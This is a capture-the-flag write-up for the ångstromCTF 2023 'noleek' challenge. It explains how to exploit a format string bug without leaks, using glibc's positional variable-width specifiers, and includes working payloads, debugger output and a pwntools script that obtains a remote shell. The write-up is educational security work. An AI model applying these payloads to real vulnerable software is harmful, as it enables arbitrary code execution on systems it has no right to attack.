---
layout: post
title: noleek | ångstromCTF 2023
description: Leakless format string exploitation
author: Alexander Zhang
tags: pwn format-string
---

This write-up is also posted on my website at <https://www.alexyzhang.dev/write-ups/angstromctf-2023/noleek/>.

## The Challenge

> My code had a couple of pesky format string vulnerabilities that kept getting exploited...I'm sure it'll fix itself if I just compile with RELRO and take away output...

We're given a binary with source code:

```c
#include <stdio.h>
#include <stdlib.h>

#define LEEK 32

void cleanup(int a, int b, int c) {}

int main(void) {
    setbuf(stdout, NULL);
    FILE* leeks = fopen("/dev/null", "w");
    if (leeks == NULL) {
        puts("wtf");
        return 1;
    }
    printf("leek? ");
    char inp[LEEK];
    fgets(inp, LEEK, stdin);
    fprintf(leeks, inp);
    printf("more leek? ");
    fgets(inp, LEEK, stdin);
    fprintf(leeks, inp);
    printf("noleek.\n");
    cleanup(0, 0, 0);
    return 0;
}
```

<pre><code>[fedora@fedora noleek]$ file noleek
noleek: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=07cfd746eba1468d59b47bae05e6420b85696e4b, for GNU/Linux 3.2.0, not stripped
[fedora@fedora noleek]$ checksec noleek
[<span style="color:#005DD0"><b>*</b></span>] &apos;/home/fedora/noleek/noleek&apos;
    Arch:     amd64-64-little
    RELRO:    <span style="color:#26A269">Full RELRO</span>
    Stack:    <span style="color:#C01C28">No canary found</span>
    NX:       <span style="color:#26A269">NX enabled</span>
    PIE:      <span style="color:#26A269">PIE enabled</span>
</code></pre>

There are two `fprintf` calls with format strings that we control, but they go to `/dev/null` so we don't get any of the output.
There's also full RELRO and PIE, so we have to overwrite the return address instead of the GOT in order to redirect execution.

I first checked if there is a usable one gadget:

<pre><code>[fedora@fedora noleek]$ one_gadget libc.so.6 
<span style="color:#D7D7FF">0xc961a</span> execve(&quot;/bin/sh&quot;, <span style="color:#5FFF00">r12</span>, <span style="color:#5FFF00">r13</span>)
<span style="color:#FF5F5F">constraints</span>:
  [<span style="color:#5FFF00">r12</span>] == NULL || <span style="color:#5FFF00">r12</span> == NULL
  [<span style="color:#5FFF00">r13</span>] == NULL || <span style="color:#5FFF00">r13</span> == NULL

<span style="color:#D7D7FF">0xc961d</span> execve(&quot;/bin/sh&quot;, <span style="color:#5FFF00">r12</span>, <span style="color:#5FFF00">rdx</span>)
<span style="color:#FF5F5F">constraints</span>:
  [<span style="color:#5FFF00">r12</span>] == NULL || <span style="color:#5FFF00">r12</span> == NULL
  [<span style="color:#5FFF00">rdx</span>] == NULL || <span style="color:#5FFF00">rdx</span> == NULL

<span style="color:#D7D7FF">0xc9620</span> execve(&quot;/bin/sh&quot;, <span style="color:#5FFF00">rsi</span>, <span style="color:#5FFF00">rdx</span>)
<span style="color:#FF5F5F">constraints</span>:
  [<span style="color:#5FFF00">rsi</span>] == NULL || <span style="color:#5FFF00">rsi</span> == NULL
  [<span style="color:#5FFF00">rdx</span>] == NULL || <span style="color:#5FFF00">rdx</span> == NULL
</code></pre>

<pre><code>[fedora@fedora noleek]$ gdb noleek_patched 
...
<span style="color:#C01C28"><b>gef➤  </b></span>disas main
Dump of assembler code for function <span style="color:#A2734C">main</span>:
...
   <span style="color:#005DD0">0x0000000000001273</span> &lt;+222&gt;:  <span style="color:#26A269">mov    </span><span style="color:#C01C28">edx</span>,<span style="color:#005DD0">0x0</span>
   <span style="color:#005DD0">0x0000000000001278</span> &lt;+227&gt;:  <span style="color:#26A269">mov    </span><span style="color:#C01C28">esi</span>,<span style="color:#005DD0">0x0</span>
   <span style="color:#005DD0">0x000000000000127d</span> &lt;+232&gt;:  <span style="color:#26A269">mov    </span><span style="color:#C01C28">edi</span>,<span style="color:#005DD0">0x0</span>
   <span style="color:#005DD0">0x0000000000001282</span> &lt;+237&gt;:  <span style="color:#26A269">call   </span><span style="color:#005DD0">0x1185</span> &lt;<span style="color:#A2734C">cleanup</span>&gt;
   <span style="color:#005DD0">0x0000000000001287</span> &lt;+242&gt;:  <span style="color:#26A269">mov    </span><span style="color:#C01C28">eax</span>,<span style="color:#005DD0">0x0</span>
   <span style="color:#005DD0">0x000000000000128c</span> &lt;+247&gt;:  <span style="color:#26A269">leave</span>
   <span style="color:#005DD0">0x000000000000128d</span> &lt;+248&gt;:  <span style="color:#26A269">ret</span>
End of assembler dump.
<span style="color:#C01C28"><b>gef➤  </b></span>b *main+248
Breakpoint 1 at <span style="color:#005DD0">0x128d</span>
<span style="color:#C01C28"><b>gef➤  </b></span>r
Starting program: <span style="color:#26A269">/home/fedora/noleek/noleek_patched</span> 
...
leek? foo
more leek? bar
noleek.

Breakpoint 1, <span style="color:#005DD0">0x000055555555528d</span> in <span style="color:#A2734C">main</span> ()

[ Legend: <span style="color:#C01C28"><b>Modified register</b></span> | <span style="color:#C01C28">Code</span> | <span style="color:#26A269">Heap</span> | <span style="color:#A347BA">Stack</span> | <span style="color:#A2734C">String</span> ]
<span style="color:#585858"><b>───────────────────────────────────────────────────────────────── </b></span><span style="color:#2AA1B3">registers</span><span style="color:#585858"><b> ────</b></span>
<span style="color:#005DD0">$rax   </span>: 0x0               
<span style="color:#005DD0">$rbx   </span>: 0x0               
<span style="color:#C01C28"><b>$rcx   </b></span>: <span style="color:#C01C28">0x00007ffff7ee1833</span>  →  0x5577fffff0003d48 (&quot;<span style="color:#A2734C">H=</span>&quot;?)
<span style="color:#005DD0">$rdx   </span>: 0x0               
<span style="color:#C01C28"><b>$rsp   </b></span>: <span style="color:#A347BA">0x00007fffffffe0f8</span>  →  <span style="color:#C01C28">0x00007ffff7e18d0a</span>  →  <span style="color:#585858"><b>&lt;__libc_start_main+234&gt; mov edi, eax</b></span>
<span style="color:#C01C28"><b>$rbp   </b></span>: <span style="color:#C01C28">0x0000555555555290</span>  →  <span style="color:#585858"><b>&lt;__libc_csu_init+0&gt; push r15</b></span>
<span style="color:#005DD0">$rsi   </span>: 0x0               
<span style="color:#005DD0">$rdi   </span>: 0x0               
<span style="color:#C01C28"><b>$rip   </b></span>: <span style="color:#C01C28">0x000055555555528d</span>  →  <span style="color:#585858"><b>&lt;main+248&gt; ret </b></span>
<span style="color:#C01C28"><b>$r8    </b></span>: 0x8               
<span style="color:#C01C28"><b>$r9    </b></span>: 0x4               
<span style="color:#C01C28"><b>$r10   </b></span>: <span style="color:#C01C28">0x000055555555601b</span>  →  <span style="color:#A2734C">&quot;more leek? &quot;</span>
<span style="color:#C01C28"><b>$r11   </b></span>: 0x246             
<span style="color:#C01C28"><b>$r12   </b></span>: <span style="color:#C01C28">0x00005555555550a0</span>  →  <span style="color:#585858"><b>&lt;_start+0&gt; xor ebp, ebp</b></span>
<span style="color:#005DD0">$r13   </span>: 0x0               
<span style="color:#005DD0">$r14   </span>: 0x0               
<span style="color:#005DD0">$r15   </span>: 0x0               
<span style="color:#C01C28"><b>$eflags</b></span>: [<b>ZERO</b> carry <b>PARITY</b> adjust sign trap <b>INTERRUPT</b> direction overflow resume virtualx86 identification]
<span style="color:#005DD0">$cs</span>: 0x33 <span style="color:#005DD0">$ss</span>: 0x2b <span style="color:#005DD0">$ds</span>: 0x00 <span style="color:#005DD0">$es</span>: 0x00 <span style="color:#005DD0">$fs</span>: 0x00 <span style="color:#005DD0">$gs</span>: 0x00 
<span style="color:#585858"><b>───────────────────────────────────────────────────────────────────── </b></span><span style="color:#2AA1B3">stack</span><span style="color:#585858"><b> ────</b></span>
<span style="color:#2AA1B3">0x00007fffffffe0f8</span>│+0x0000: <span style="color:#C01C28">0x00007ffff7e18d0a</span>  →  <span style="color:#585858"><b>&lt;__libc_start_main+234&gt; mov edi, eax</b></span>  <span style="color:#005DD0"><b> ← $rsp</b></span>
<span style="color:#2AA1B3">0x00007fffffffe100</span>│+0x0008: <span style="color:#A347BA">0x00007fffffffe1e8</span>  →  <span style="color:#A347BA">0x00007fffffffe492</span>  →  <span style="color:#A2734C">&quot;/home/fedora/noleek/noleek_patched&quot;</span>
<span style="color:#2AA1B3">0x00007fffffffe108</span>│+0x0010: 0x0000000100000000
<span style="color:#2AA1B3">0x00007fffffffe110</span>│+0x0018: <span style="color:#C01C28">0x0000555555555195</span>  →  <span style="color:#585858"><b>&lt;main+0&gt; push rbp</b></span>
<span style="color:#2AA1B3">0x00007fffffffe118</span>│+0x0020: <span style="color:#C01C28">0x00007ffff7e187cf</span>  →  <span style="color:#585858"><b> mov rbp, rax</b></span>
<span style="color:#2AA1B3">0x00007fffffffe120</span>│+0x0028: 0x0000000000000000
<span style="color:#2AA1B3">0x00007fffffffe128</span>│+0x0030: 0xaa9bed2528a457b0
<span style="color:#2AA1B3">0x00007fffffffe130</span>│+0x0038: <span style="color:#C01C28">0x00005555555550a0</span>  →  <span style="color:#585858"><b>&lt;_start+0&gt; xor ebp, ebp</b></span>
<span style="color:#585858"><b>─────────────────────────────────────────────────────────────── </b></span><span style="color:#2AA1B3">code:x86:64</span><span style="color:#585858"><b> ────</b></span>
   <span style="color:#585858"><b>0x555555555282 &lt;main+237&gt;       call   0x555555555185 &lt;cleanup&gt;</b></span>
   <span style="color:#585858"><b>0x555555555287 &lt;main+242&gt;       mov    eax, 0x0</b></span>
   <span style="color:#585858"><b>0x55555555528c &lt;main+247&gt;       leave  </b></span>
 <span style="color:#26A269">→ 0x55555555528d &lt;main+248&gt;       ret    </span>
   ↳  0x7ffff7e18d0a &lt;__libc_start_main+234&gt; mov    edi, eax
      0x7ffff7e18d0c &lt;__libc_start_main+236&gt; call   0x7ffff7e30660 &lt;exit&gt;
      0x7ffff7e18d11 &lt;__libc_start_main+241&gt; mov    rax, QWORD PTR [rsp]
      0x7ffff7e18d15 &lt;__libc_start_main+245&gt; lea    rdi, [rip+0x171d0c]        # 0x7ffff7f8aa28
      0x7ffff7e18d1c &lt;__libc_start_main+252&gt; mov    rsi, QWORD PTR [rax]
      0x7ffff7e18d1f &lt;__libc_start_main+255&gt; xor    eax, eax
<span style="color:#585858"><b>─────────────────────────────────────────────────────────────────── </b></span><span style="color:#2AA1B3">threads</span><span style="color:#585858"><b> ────</b></span>
[<span style="color:#26A269"><b>#0</b></span>] Id 1, Name: &quot;noleek_patched&quot;, <span style="color:#C01C28"><b>stopped</b></span> <span style="color:#005DD0">0x55555555528d</span> in <span style="color:#A2734C"><b>main</b></span> (), reason: <span style="color:#A347BA"><b>BREAKPOINT</b></span>
<span style="color:#585858"><b>───────────────────────────────────────────────────────────────────── </b></span><span style="color:#2AA1B3">trace</span><span style="color:#585858"><b> ────</b></span>
[<span style="color:#26A269"><b>#0</b></span>] 0x55555555528d → <span style="color:#26A269">main</span>()
<span style="color:#585858"><b>────────────────────────────────────────────────────────────────────────────────</b></span>
</code></pre>

The last one gadget has its constraints satisfied when `main` returns, so it looks like we need to compute the address of this one gadget and the address of the return address using format strings.
The good news is that since the `fprintf` calls output to `/dev/null`, we can write a ton of data and it won't take forever.

## Adding Numbers with Format Strings

The usual way do arbitrary write using format strings is to output a number of characters equal to the value that needs to be written using a format specifier with a minimum width like `%42c`.
Then, the `%n` format specifier can be used to write the value to some address in a register or on the stack.
If we can make `fprintf` output a number of characters equal to some value in the registers or memory, we would be able to add something to that value by outputting additional characters and then write the sum using `%n`.

I read the documentation from [cppreference.com](https://en.cppreference.com/w/c/io/fprintf) and the [glibc manual](https://www.gnu.org/software/libc/manual/html_node/Formatted-Output.html), but I couldn't figure out how to do this and got stuck for a while.
I guessed that there might be a way to specify a variable field width, so I searched up "printf variable width" and found this [Stack Overflow answer](https://stackoverflow.com/questions/7105890/set-variable-text-column-width-in-printf/7105918#7105918).
It turns out that an asterisk can be used for the field width like `%*c` and the value will be taken from an argument.
This was mentioned in the docs, but I missed it.
A small caveat is that the value will be interpreted as a signed integer and its absolute value will be used if it's negative so this would only work around half of the time.

I came up with a plan:
1. Find a pointer on the stack which points to a stack pointer on the stack.
2. Use the first `fprintf` to read the four lower bytes of a stack pointer, add the offset to the address of the return address, and write that to the lower four bytes of an existing stack pointer on the stack using the pointer from step 1.
3. Use the second `fprintf` to read the four lower bytes of a libc pointer, add the offset to the address of the one gadget, and write that to the lower four bytes of the return address of `main` using the pointer to the return address created in step 2. Note that the return address of `main` should already be in libc.

## Creating a Pointer to the Return Address

Initially, I didn't know how the variable field width works with POSIX positional arguments.
I thought that maybe `%9$*c` would take the width from the 9th argument and the value from the 10th argument.
There was a stack pointer on the stack at the position of the 9th argument, so I tried `%9$*c` and it seemed to work except that the resulting value was a little different than what I expected.
It turns out that the width is just the next unused argument and there happened to be a stack pointer in the argument registers, so just `%*c` would work.
Right before the first `fprintf` call, there's a stack pointer pointing to another stack pointer at `rsp + 0x40`, which corresponds to the 13th argument.

<pre><code><span style="color:#26A269"><b>gef➤  </b></span>deref
<span style="color:#2AA1B3">0x00007fffffffe0c0</span>│+0x0000: 0x000000000a6f6f66 (&quot;<span style="color:#A2734C">foo\n</span>&quot;?) <span style="color:#005DD0"><b> ← $rdx, $rsp, $rsi, $r8</b></span>
<span style="color:#2AA1B3">0x00007fffffffe0c8</span>│+0x0008: 0x0000000000000000
<span style="color:#2AA1B3">0x00007fffffffe0d0</span>│+0x0010: <span style="color:#C01C28">0x0000555555555290</span>  →  <span style="color:#585858"><b>&lt;__libc_csu_init+0&gt; push r15</b></span>
<span style="color:#2AA1B3">0x00007fffffffe0d8</span>│+0x0018: <span style="color:#C01C28">0x00005555555550a0</span>  →  <span style="color:#585858"><b>&lt;_start+0&gt; xor ebp, ebp</b></span>
<span style="color:#2AA1B3">0x00007fffffffe0e0</span>│+0x0020: <span style="color:#A347BA">0x00007fffffffe1e0</span>  →  0x0000000000000001
<span style="color:#2AA1B3">0x00007fffffffe0e8</span>│+0x0028: <span style="color:#26A269">0x000055555555b2a0</span>  →  0x00000000fbad2484
<span style="color:#2AA1B3">0x00007fffffffe0f0</span>│+0x0030: <span style="color:#C01C28">0x0000555555555290</span>  →  <span style="color:#585858"><b>&lt;__libc_csu_init+0&gt; push r15</b></span><span style="color:#005DD0"><b> ← $rbp</b></span>
<span style="color:#2AA1B3">0x00007fffffffe0f8</span>│+0x0038: <span style="color:#C01C28">0x00007ffff7e18d0a</span>  →  <span style="color:#585858"><b>&lt;__libc_start_main+234&gt; mov edi, eax</b></span>
<span style="color:#2AA1B3">0x00007fffffffe100</span>│+0x0040: <span style="color:#A347BA">0x00007fffffffe1e8</span>  →  <span style="color:#A347BA">0x00007fffffffe491</span>  →  <span style="color:#A2734C">&quot;/home/fedora/noleek/noleek_patched&quot;</span>
<span style="color:#2AA1B3">0x00007fffffffe108</span>│+0x0048: 0x0000000100000000
</code></pre>

I calculated the offset and was able to write the address of the return address onto the stack with `%1$56c%*c%13$n`.
The `%1$56c` outputs 56 characters, then the `%*c` outputs a number of characters equal to the lower four bytes of the stack pointer in `rdx` which is equal to `rsp`.
Now the number of characters outputted is the lower four bytes of `rsp + 56`, which is the address of the return address.
The `%13$n` writes this value to the location pointed to by the 13th argument, overwriting the lower four bytes of the existing stack pointer on the stack.
GDB and GEF confirm that the value pointed to by the stack pointer at `rsp + 0x40` is now a pointer to the return address:

<pre><code><span style="color:#26A269"><b>gef➤  </b></span>deref
<span style="color:#2AA1B3">0x00007ffe010d4320</span>│+0x0000: <span style="color:#A2734C">&quot;%42c%42$n\n&quot;</span>   <span style="color:#005DD0"><b> ← $rdx, $rsp, $rsi, $r8</b></span>
<span style="color:#2AA1B3">0x00007ffe010d4328</span>│+0x0008: 0x000a6e2433000a6e (&quot;<span style="color:#A2734C">n\n</span>&quot;?)
<span style="color:#2AA1B3">0x00007ffe010d4330</span>│+0x0010: <span style="color:#C01C28">0x000055ba5459b290</span>  →  <span style="color:#585858"><b>&lt;__libc_csu_init+0&gt; push r15</b></span>
<span style="color:#2AA1B3">0x00007ffe010d4338</span>│+0x0018: <span style="color:#C01C28">0x000055ba5459b0a0</span>  →  <span style="color:#585858"><b>&lt;_start+0&gt; xor ebp, ebp</b></span>
<span style="color:#2AA1B3">0x00007ffe010d4340</span>│+0x0020: <span style="color:#A347BA">0x00007ffe010d4440</span>  →  0x0000000000000001
<span style="color:#2AA1B3">0x00007ffe010d4348</span>│+0x0028: <span style="color:#26A269">0x000055ba554402a0</span>  →  0x00000000fbad2c84
<span style="color:#2AA1B3">0x00007ffe010d4350</span>│+0x0030: <span style="color:#C01C28">0x000055ba5459b290</span>  →  <span style="color:#585858"><b>&lt;__libc_csu_init+0&gt; push r15</b></span><span style="color:#005DD0"><b> ← $rbp</b></span>
<span style="color:#2AA1B3">0x00007ffe010d4358</span>│+0x0038: <span style="color:#C01C28">0x00007f980b405d0a</span>  →  <span style="color:#585858"><b>&lt;__libc_start_main+234&gt; mov edi, eax</b></span>
<span style="color:#2AA1B3">0x00007ffe010d4360</span>│+0x0040: <span style="color:#A347BA">0x00007ffe010d4448</span>  →  <span style="color:#A347BA">0x00007ffe010d4358</span>  →  <span style="color:#C01C28">0x00007f980b405d0a</span>  →  <span style="color:#585858"><b>&lt;__libc_start_main+234&gt; mov edi, eax</b></span>
<span style="color:#2AA1B3">0x00007ffe010d4368</span>│+0x0048: 0x0000000100000000
</code></pre>

## Overwriting the Return Address

Now that there's a pointer to the return address on the stack, we can overwrite the return address with the second `fprintf`.
The pointer to the return address is at `rsp + 0x128`, which is the 42nd argument.
As a test, I put `%42c%42$n` for the second `fprintf` to write `42` to the lower four bytes of the return address.
After the call, GDB shows that we have successfully overwrote those bytes with 42, which is 0x2a in hex:

<pre><code><span style="color:#2AA1B3">0x00007ffc57b78de0</span>│+0x0000: <span style="color:#A2734C">&quot;%42c%42$n\n&quot;</span>   <span style="color:#005DD0"><b> ← $rsp</b></span>
<span style="color:#2AA1B3">0x00007ffc57b78de8</span>│+0x0008: 0x000a6e2433000a6e (&quot;<span style="color:#A2734C">n\n</span>&quot;?)
<span style="color:#2AA1B3">0x00007ffc57b78df0</span>│+0x0010: <span style="color:#C01C28">0x0000556b035b4290</span>  →  <span style="color:#585858"><b>&lt;__libc_csu_init+0&gt; push r15</b></span>
<span style="color:#2AA1B3">0x00007ffc57b78df8</span>│+0x0018: <span style="color:#C01C28">0x0000556b035b40a0</span>  →  <span style="color:#585858"><b>&lt;_start+0&gt; xor ebp, ebp</b></span>
<span style="color:#2AA1B3">0x00007ffc57b78e00</span>│+0x0020: <span style="color:#A347BA">0x00007ffc57b78f00</span>  →  0x0000000000000001
<span style="color:#2AA1B3">0x00007ffc57b78e08</span>│+0x0028: <span style="color:#26A269">0x0000556b03bb92a0</span>  →  0x00000000fbad2c84
<span style="color:#2AA1B3">0x00007ffc57b78e10</span>│+0x0030: <span style="color:#C01C28">0x0000556b035b4290</span>  →  <span style="color:#585858"><b>&lt;__libc_csu_init+0&gt; push r15</b></span><span style="color:#005DD0"><b> ← $rbp</b></span>
<span style="color:#2AA1B3">0x00007ffc57b78e18</span>│+0x0038: 0x00007f6b0000002a (&quot;<span style="color:#A2734C">*</span>&quot;?)
</code></pre>

Next, we have to calculate the one gadget address.
The closest libc pointer is the original return address of `main`, which is the 12th argument.
I therefore tried doing `%c%c%c%c%c%c%c%c%c%c%678156c%*c%42$n`.
The part before the `%*c` consumes 11 arguments and outputs 678166 bytes, which is the offset to the one gadget.
The `%*c` adds this to the original return address and the `%42$n` overwrites the return address with the result... except it didn't work.

After some debugging, I figured out that the format string was just too long.
It had to be at most 31 characters because the `inp` buffer is 32 characters long, and my payload is 36 characters.

![A screenshot of Discord messages between me and Aplet123.
kaiphait: "did you really have to put that length limit"
Aplet123: "yes"](/assets/posts/angstrom-noleek/limit.webp)

## Format String Golfing

I tried to think of ways to consume arguments using less characters than `%c`.
`%*c` consumes two arguments using only three characters, but it outputs a variable amount of characters so it wouldn't work there.
I also found a [Trail of Bits paper](http://trailofbits.github.io/ctf/exploits/references/formatstring-1.2.pdf) which suggested using multiple asterisks followed by a digit like `%*****1c`, but that seemed to be outdated and didn't work with the version of glibc here.
I thought that maybe there is some other quirk in the format string parsing code that I could exploit, so I decided to try reading the glibc source code.

I found the [format string parsing code](https://elixir.bootlin.com/glibc/glibc-2.35/source/stdio-common/vfprintf-internal.c#L1177) after some digging around.
This is the code that handles variable width format specifies:

```c
  /* Get width from argument.  */
LABEL (width_asterics):
  {
    const UCHAR_T *tmp;        /* Temporary value.  */

    tmp = ++f;
    if (ISDIGIT (*tmp))
      {
        int pos = read_int (&tmp);

        if (pos == -1)
          {
            __set_errno (EOVERFLOW);
            done = -1;
            goto all_done;
          }

        if (pos && *tmp == L_('$'))
          /* The width comes from a positional parameter.  */
          goto do_positional;
      }
    width = va_arg (ap, int);

    /* Negative width means left justified.  */
    if (width < 0)
      {
        width = -width;
        pad = L_(' ');
        left = 1;
      }
  }
  JUMP (*f, step1_jumps);
```

This part looks interesting:

```c
if (pos && *tmp == L_('$'))
  /* The width comes from a positional parameter.  */
  goto do_positional;
```

It looks like there's a way to specify the width argument with a positional argument!
When the code finds a positional argument, it switches to a [different parser](https://elixir.bootlin.com/glibc/glibc-2.35/source/stdio-common/printf-parsemb.c#L50).
Here's the variable field width code from that parser:

```c
if (*format == L_('*'))
  {
    /* The field width is given in an argument.
       A negative field width indicates left justification.  */
    const UCHAR_T *begin = ++format;

    if (ISDIGIT (*format))
      {
        /* The width argument might be found in a positional parameter.  */
        n = read_int (&format);

        if (n != 0 && *format == L_('$'))
          {
            if (n != -1)
              {
                spec->width_arg = n - 1;
                *max_ref_arg = MAX (*max_ref_arg, n);
              }
            ++format;                /* Skip '$'.  */
          }
      }

    if (spec->width_arg < 0)
      {
        /* Not in a positional parameter.  Consume one argument.  */
        spec->width_arg = posn++;
        ++nargs;
        format = begin;        /* Step back and reread.  */
      }
  }
```

So instead of consuming arguments with `%c`, we can just use `%*12$c` and that will use the 12th argument as the width.
Now the second format string can be shortened to `%*12$c%678166c%42$n`, and after a few tries I was able to get a shell:

<pre><code>[fedora@fedora noleek]$ ./solve.py REMOTE
[<span style="color:#005DD0"><b>*</b></span>] &apos;/home/fedora/noleek/noleek_patched&apos;
    Arch:     amd64-64-little
    RELRO:    <span style="color:#26A269">Full RELRO</span>
    Stack:    <span style="color:#C01C28">No canary found</span>
    NX:       <span style="color:#26A269">NX enabled</span>
    PIE:      <span style="color:#26A269">PIE enabled</span>
    RUNPATH:  <span style="color:#C01C28">b&apos;.&apos;</span>
[<span style="color:#005DD0"><b>*</b></span>] &apos;/home/fedora/noleek/libc.so.6&apos;
    Arch:     amd64-64-little
    RELRO:    <span style="color:#A2734C">Partial RELRO</span>
    Stack:    <span style="color:#26A269">Canary found</span>
    NX:       <span style="color:#26A269">NX enabled</span>
    PIE:      <span style="color:#26A269">PIE enabled</span>
[<span style="color:#005DD0"><b>*</b></span>] &apos;/home/fedora/noleek/ld-linux-x86-64.so.2&apos;
    Arch:     amd64-64-little
    RELRO:    <span style="color:#A2734C">Partial RELRO</span>
    Stack:    <span style="color:#C01C28">No canary found</span>
    NX:       <span style="color:#26A269">NX enabled</span>
    PIE:      <span style="color:#26A269">PIE enabled</span>
[<span style="color:#26A269"><b>+</b></span>] Opening connection to challs.actf.co on port 31400: Done
[<span style="color:#005DD0"><b>*</b></span>] Switching to interactive mode
<span style="color:#C01C28"><b>$</b></span> ls
<span style="color:#C01C28"><b>$</b></span> ls
<span style="color:#C01C28"><b>$</b></span> ls
noleek.
flag.txt
run
flag.txt
run
flag.txt
run
<span style="color:#C01C28"><b>$</b></span> cat flag.txt
actf{t0_l33k_0r_n0t_t0_l33k_th4t_1s_th3_qu3sti0n}
</code></pre>

Here's the solve script, which simply solves the POW and then sends the two format strings:

```python
#!/usr/bin/env python3

import subprocess

from pwn import *

exe = ELF("noleek_patched")
libc = ELF("libc.so.6")
ld = ELF("ld-linux-x86-64.so.2")

context.binary = exe

if args.REMOTE:
    r = remote("challs.actf.co", 31400)
    r.recvuntil(b"work: ")
    cmd = r.recvlineS()
    r.sendafter(b"solution: ", subprocess.run(cmd, shell=True, capture_output=True).stdout)
else:
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r, "b *main+205\nb *main+248\nc")

r.sendlineafter(b"leek? ", b"%1$56c%*c%13$n")
r.sendlineafter(b"leek? ", b"%*12$c%678166c%42$n")

r.interactive()
```

While writing this write-up, I found out that the syntax which allows variable widths to be specified using positional arguments is mentioned in the [POSIX standard](https://pubs.opengroup.org/onlinepubs/9699919799/functions/printf.html) and the [Stack Overflow answer](https://stackoverflow.com/questions/7105890/set-variable-text-column-width-in-printf/18477417#18477417) right after the one that I read.
